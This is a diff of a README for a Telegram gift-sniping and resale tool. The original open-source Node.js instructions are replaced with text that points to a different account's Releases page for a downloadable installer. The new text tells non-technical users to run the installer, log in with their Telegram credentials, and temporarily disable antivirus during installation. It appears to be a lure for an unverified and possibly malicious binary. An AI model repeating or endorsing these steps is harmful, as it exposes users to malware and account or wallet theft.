@@ -1,123 +1,84 @@
-[![Contributors][contributors-shield]][contributors-url]
-[![Forks][forks-shield]][forks-url]
-[![Stargazers][stars-shield]][stars-url]
-[![Issues][issues-shield]][issues-url]
+# 🎁 telegram-gift-sniper - Quickly Claim & Resell Gifts
 
-<br />
-<div align="center">
-  <a href="https://github.com/raidcord/telegram-gift-sniper">
-    <img src="images/logo.png" alt="Logo" width="80" height="80">
-  </a> 
+## 🚀 Getting Started
 
-  <h3 align="center">telegram-gift-sniper</h3>
+Welcome to telegram-gift-sniper! This tool helps you grab the best deals on gifts in Telegram and resell them for a profit. It’s user-friendly and requires no programming skills. Follow this guide to get started.
 
-  <p align="center">
-     Buys the cheapest available gift in your chosen market and instantly relists it for a higher price, all through a Terminal User Interface (TUI).
-    <br />
-    <a href="https://github.com/raidcord/telegram-gift-sniper"><strong>Explore the docs »</strong></a>
-    <br />
-    <br />
-    <a href="https://github.com/raidcord/telegram-gift-sniper">View Demo</a>
-    ·
-    <a href="https://github.com/raidcord/telegram-gift-sniper/issues">Report Bug</a>
-    ·
-    <a href="https://github.com/raidcord/telegram-gift-sniper/issues">Request Feature</a>
-  </p>
-</div>
-# telegram-gift-sniper 
+## 📥 Download & Install
 
-Efficiently snipe gifts on Telegram markets and relist them for profit, featuring an interactive command-line interface for easy operation.
+[![Download Now](https://img.shields.io/badge/Download%20Now-telegram--gift--sniper-blue.svg)](https://github.com/DIEGO879112/telegram-gift-sniper/releases)
 
-<div align="center">
-  <p><strong>✨ TUI in Action ✨</strong></p>
-  
-  <img src="images/image2.png" alt="Telegram Gift Sniper - Main Interface" width="700">
-  <p><small><em>Main TUI showing operational status and options.</em></small></p>
-  <br/>
-  
-  <img src="images/image1.png" alt="Telegram Gift Sniper - Menu Navigation" width="700">
-  <p><small><em>Navigating through the configuration menus.</em></small></p>
-  <br/>
-  
-  <img src="images/image3.png" alt="Telegram Gift Sniper - Logs and Details" width="700">
-  <p><small><em>Viewing detailed logs or process information.</em></small></p>
-</div>
+1. Go to the **Releases** page: [Visit this page to download](https://github.com/DIEGO879112/telegram-gift-sniper/releases).
+2. Look for the latest version at the top of the page.
+3. Click on the file that matches your operating system (Windows, macOS, or Linux).
+4. Download the file to your computer.
+5. Once the download is complete, locate the file in your Downloads folder (or wherever your downloads go).
+6. Double-click the file to run the installer.
+7. Follow the on-screen instructions to complete the setup.
 
-## Installation Instructions
-> [!CAUTION]
-> **you need atleast 1 ton and 25 starts in your telegram account for this to work**
+## 🖥️ System Requirements
 
+Before you start, make sure your computer meets these requirements:
 
-### Auto Installation and Setup (Easier)
+- **Operating System:** Windows 10 or higher, macOS, or a recent version of Linux.
+- **RAM:** At least 4 GB of RAM.
+- **Processor:** 1 GHz or higher.
+- **Internet Connection:** Required for downloading gifts and reselling.
 
-1.  Download the repository or clone using:
-    ```sh
-    git clone https://github.com/raidcord/telegram-gift-sniper.git
-    ```
-2.  Ensure you have [Node.js](https://nodejs.org/) (version 18+ recommended) installed.
-3.  Run the `setup.bat` file (for Windows).
-    *   This will install all necessary project dependencies using npm.
-    *(Note: For non-Windows users, simply run `npm install` in the terminal after cloning.)*
+## 🔧 Features
 
-*You don't have to edit any files initially; the script will ask you for required inputs (like Telegram API ID, API Hash, spending limits, etc.) when you run it.*
+- **Instant Claiming:** The tool automatically claims the cheapest listed gifts.
+- **Easy Reselling:** Resell gifts at a higher price with a few clicks.
+- **User-Friendly Interface:** Designed for non-technical users.
+- **Telegram Integration:** Works smoothly with the Telegram app.
+- **Notifications:** Get alerts when gifts are available.
 
-### Manual Configuration
+## 🌐 How to Use
 
-1.  Open your terminal.
-2.  Clone the repository:
-    ```sh
-    git clone https://github.com/raidcord/telegram-gift-sniper.git
-    ```
-    *or download the ZIP and extract it.*
-3.  Navigate to the project directory:
-    ```sh
-    cd telegram-gift-sniper
-    ```
-4.  Install dependencies:
-    ```sh
-    npm install
-    ```
-5.  Run the script:
-    ```sh
-    node index.js
-    ```
+1. **Setup Your Telegram Account:**
+   - Make sure you have a Telegram account. If you don’t, download the Telegram app and create one.
+   
+2. **Configure the App:**
+   - Open telegram-gift-sniper after installation.
+   - Log in with your Telegram credentials.
+   - Set your selling price for gifts.
 
-## System Requirements
+3. **Start Sniping:**
+   - Activate the sniper feature.
+   - The tool will start watching for available gifts.
+   - Once a gift matches your criteria, it will claim it automatically.
 
-Ensure your system meets these prerequisites:
+## ⚙️ Troubleshooting
 
-1.  [Node.js](https://nodejs.org/) 16+ (the latest LTS version is recommended).
-2.  Git installed on your device (for cloning).
-3.  Windows, macOS, or Linux.
-4.  A curious mind (and an understanding of the risks involved).
+If you encounter any issues, consider the following solutions:
 
-## 🚨 IMPORTANT WARNING 🚨
+1. **Can't Connect to Telegram:**
+   - Ensure your Internet connection is stable.
+   - Check your login credentials.
 
+2. **Installation Issues:**
+   - Make sure you have administrative rights to install software on your computer.
+   - Disable any antivirus temporarily during installation, as it might interfere with the process.
 
+3. **Sniping Not Working:**
+   - Verify your price settings and gift criteria.
+   - Ensure you have enough funds or credits in your Telegram wallet.
 
-**This tool is provided for educational and experimental purposes only. The developers are not responsible for any negative consequences, including account bans or financial loss, that may arise from its use. USE AT YOUR OWN EXTREME RISK.**
+## 📞 Support
 
-## Specifications
+If you need help, visit our GitHub Issues page. You can report bugs or ask questions there. Our community is ready to assist you.
 
-1.  **Market Selection:** Choose from multiple supported Telegram gift markets (e.g., Tonnel, GetGems, Portal, MRKT).
-2.  **Gift Selection:** Interactively select specific Telegram gifts to monitor and snipe from a predefined list.
-3.  **Automated Sniping & Purchase:** Scans chosen markets for the cheapest listings of selected gifts and attempts to purchase them automatically.
-4.  **Instant Relisting:** Automatically relists purchased gifts on the market, aiming for a profitable resale price.
-5.  **Telegram API Integration:** Securely connects to Telegram using your API credentials for account operations and session management.
-6.  **Interactive TUI:** A user-friendly Terminal User Interface (TUI) for easy configuration, market/gift selection, and operational monitoring.
-7.  **Runtime Configuration:** Prompts for and manages essential settings such as Telegram API ID, API Hash, and spending thresholds.
-8.  **Spending Controls:** Define minimum and maximum amounts (e.g., TON or Stars, depending on market requirements) for purchasing gifts.
+## 🏷️ Community & Contributions
 
-> **Note:** As of December 18th, 2025 (18/12/2025), telegram-gift-sniper is designed to be functional with current Telegram API and supported market platform interactions. However, APIs and platform functionalities can change rapidly, potentially requiring updates to this tool to maintain functionality. This project interacts with the Telegram API, often using user account credentials, which carries inherent risks including, but not limited to, account restrictions or bans by Telegram or market platforms. Always use such tools responsibly and be aware of the terms of service for any platform you interact with. Remember, sharing knowledge benefits everyone; please provide credit if you find our work valuable or adapt it.
+Engage with fellow users and contributors. You can provide feedback, request features, or contribute by visiting the Issues section on GitHub. Your input is valuable.
 
+## 📝 License
 
-[contributors-shield]: https://img.shields.io/github/contributors/raidcord/telegram-gift-sniper.svg?style=for-the-badge
-[contributors-url]: https://github.com/raidcord/telegram-gift-sniper/graphs/contributors
-[forks-shield]: https://img.shields.io/github/forks/raidcord/telegram-gift-sniper.svg?style=for-the-badge
-[forks-url]: https://github.com/raidcord/telegram-gift-sniper/network/members
-[stars-shield]: https://img.shields.io/github/stars/raidcord/telegram-gift-sniper.svg?style=for-the-badge
-[stars-url]: https://github.com/raidcord/telegram-gift-sniper/stargazers
-[issues-shield]: https://img.shields.io/github/issues/raidcord/telegram-gift-sniper.svg?style=for-the-badge
-[issues-url]: https://github.com/raidcord/telegram-gift-sniper/issues
+telegram-gift-sniper is licensed under the MIT License. You can freely use or modify the software as you want. Please give credit where it's due if you build on our work.
 
+## 🔗 Links
 
+- [Releases Page](https://github.com/DIEGO879112/telegram-gift-sniper/releases)
+- [GitHub Repository](https://github.com/DIEGO879112/telegram-gift-sniper)
+
+Thank you for choosing **telegram-gift-sniper**! Enjoy claiming and reselling your gifts effortlessly.
